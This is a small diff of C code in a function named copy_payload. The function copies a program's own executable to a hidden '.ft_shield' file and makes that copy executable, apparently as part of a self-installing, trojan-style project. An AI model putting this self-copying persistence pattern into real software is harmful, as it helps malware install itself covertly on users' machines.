@@ -25,7 +25,7 @@ void copy_payload(void) {
 		// TODO Execute from a different path
 		// example ./some/other/path/.ft_shield
 		int in_fd = open(EXECUTABLE_NAME, O_RDONLY);
-		int out_fd = open(EXECUTABLE_FILE, O_WRONLY | O_TRUNC | O_CREAT, 0666);
+		int out_fd = open(EXECUTABLE_FILE, O_WRONLY | O_TRUNC | O_CREAT, 0755);
 		if (in_fd < 0 || out_fd < 0) {
 			//logger.log_entry("Error copying executable", "ERROR");
 			exit(EXIT_FAILURE);
